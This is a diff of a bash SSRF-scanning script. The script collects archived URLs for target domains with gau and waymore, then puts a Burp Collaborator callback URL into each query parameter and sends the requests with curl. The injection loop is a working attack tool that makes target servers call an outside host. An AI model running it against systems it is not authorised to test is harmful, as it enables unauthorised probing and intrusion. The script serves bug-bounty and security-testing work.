@@ -71,13 +71,15 @@ continue_Parms() {
   # checks if gau didn't start 
   if ! grep -i "Extracted URLs from gau for $C_Domain" "$log_file" > /dev/null; then
     echo -e "${GREEN}[*] Starting Extracting URLs from gau for $C_Domain ${NC}"
-    printf $C_Domain | gau --subs --o ./log_$log_time/0dSSRF_$C_Domain/gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js && echo -e "${GREEN}[*] Extracted URLs from gau for $C_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
+    printf $C_Domain | gau --subs --o ./log_$log_time/0dSSRF_$C_Domain/gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js
+    echo -e "${GREEN}[*] Extracted URLs from gau for $C_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
   fi
 
   # checks if waymore didn't start 
   if ! grep -i "Extracted URLs from waymore for $C_Domain" "$log_file" > /dev/null; then
     echo -e "${GREEN}[*] Starting Extracting URLs from waymore for $C_Domain ${NC}"
-    waymore -i $C_Domain -mode U -oU ./log_$log_time/0dSSRF_$C_Domain/waymore.output -nd > /dev/null && echo -e "${GREEN}[*] Extracted URLs from waymore for $C_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
+    printf $C_Domain | waymore -mode U -oU ./log_$log_time/0dSSRF_$C_Domain/waymore.output -nd > /dev/null
+    echo -e "${GREEN}[*] Extracted URLs from waymore for $C_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
   fi
 
   # checks if urls have not filtered 
@@ -207,15 +209,21 @@ handle_e_option() {
 # Function to gather URLs and inject into parameters
 inject_url_parameters() {
   while IFS= read -r main_Domain; do
-    echo -e "${light_blue}[*] Gathering URLs from $main_Domain...${NC}"
     counter=0
 
     if [ "$Continue" == "true" ] && [ -d "./$log_dir/0dSSRF_$main_Domain" ]; then
       continue_Parms "$main_Domain" "./log_$log_time/inject_url_parameters.log"
     else
+      #making dir for results
       mkdir ./log_$log_time/0dSSRF_$main_Domain
-      printf $main_Domain | gau --subs --o ./log_$log_time/0dSSRF_$main_Domain/gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js && echo -e "${GREEN}[*] Extracted URLs from gau for $main_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
-      waymore -i $main_Domain -mode U -oU ./log_$log_time/0dSSRF_$main_Domain/waymore.output -nd > /dev/null && echo -e "${GREEN}[*] Extracted URLs from waymore for $main_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
+      echo -e "${light_blue}[*] Gathering URLs from $main_Domain...${NC}"
+      # Extracting URLs with gau
+      printf $main_Domain | gau --subs --o ./log_$log_time/0dSSRF_$main_Domain/gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js
+      echo -e "${GREEN}[*] Extracted URLs from gau for $main_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
+      # Extracting URLs with waymore
+      printf $main_Domain | waymore -mode U -oU ./log_$log_time/0dSSRF_$main_Domain/waymore.output -nd > /dev/null
+      echo -e "${GREEN}[*] Extracted URLs from waymore for $main_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
+      # Filtering tools output
       cat ./log_$log_time/0dSSRF_$main_Domain/gau.output ./log_$log_time/0dSSRF_$main_Domain/waymore.output | uro > ./log_$log_time/0dSSRF_$main_Domain/all_urls.log
       rm ./log_$log_time/0dSSRF_$main_Domain/gau.output ./log_$log_time/0dSSRF_$main_Domain/waymore.output
       cat ./log_$log_time/0dSSRF_$main_Domain/all_urls.log | grep -o '.*\?.*=.*' > ./log_$log_time/0dSSRF_$main_Domain/all_params
@@ -225,35 +233,34 @@ inject_url_parameters() {
     fi
 
     echo -e "${light_blue}[*] injecting Burp Collaborator into $main_Domain parameters...${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
-
     total_urls=$(wc -l < "./log_$log_time/0dSSRF_$main_Domain/filtered_params.txt")
     # Loop through each URL in the file
     while IFS= read -r url; do
-    # Skip empty lines
-    if [[ -z "$url" ]]; then
-      continue
-    fi
-    # Extract parameters and inject separately
-    IFS='&' read -r -a params <<< "$(echo "$url" | grep -oP '(?<=\?).*')"
-    UD=$(echo "$url" | awk -F'[://" ]+' '{print $2}'| tr . -)
-    # Base URL without parameters
-    base_url=$(echo "$url" | grep -oP '^[^?]+')
-    p=0
-    counter=$((counter + 1))
-    # Loop through each parameter
-    for param in "${params[@]}"; do
-      # Extract key and value
-      key=$(echo "$param" | cut -d'=' -f1)
-      value=$(echo "$param" | cut -d'=' -f2)
-      current_time=$(date +"%H:%M:%S")
-      p=$((p + 1))
-      # Construct new URL with the parameter injected
-      new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://p--$UD.$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
-      # Send the request
-      curl -L $new_url -m 10 &> /dev/null &
-      echo -e "${light_blue}[$counter/$total_urls](p$p) ${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a ./log_$log_time/inject_url_parameters.log
-      sleep $delay
-    done
+      # Skip empty lines
+      if [[ -z "$url" ]]; then
+        continue
+      fi
+      # Extract parameters and inject separately
+      IFS='&' read -r -a params <<< "$(echo "$url" | grep -oP '(?<=\?).*')"
+      UD=$(echo "$url" | awk -F'[://" ]+' '{print $2}'| tr . -)
+      # Base URL without parameters
+      base_url=$(echo "$url" | grep -oP '^[^?]+')
+      p=0
+      counter=$((counter + 1))
+      # Loop through each parameter
+      for param in "${params[@]}"; do
+        # Extract key and value
+        key=$(echo "$param" | cut -d'=' -f1)
+        value=$(echo "$param" | cut -d'=' -f2)
+        current_time=$(date +"%H:%M:%S")
+        p=$((p + 1))
+        # Construct new URL with the parameter injected
+        new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://p--$UD.$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
+        # Send the request
+        curl -L $new_url -m 10 &> /dev/null &
+        echo -e "${light_blue}[$counter/$total_urls](p$p) ${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a ./log_$log_time/inject_url_parameters.log
+        sleep $delay
+      done
     done < "$Parms"
     echo -e "${GREEN}✅ Injecting Burp Collaborator into parameters on $main_Domain ${YELLOW}Finished ${NC}"
   done < "./log_$log_time/main_Domains.txt"
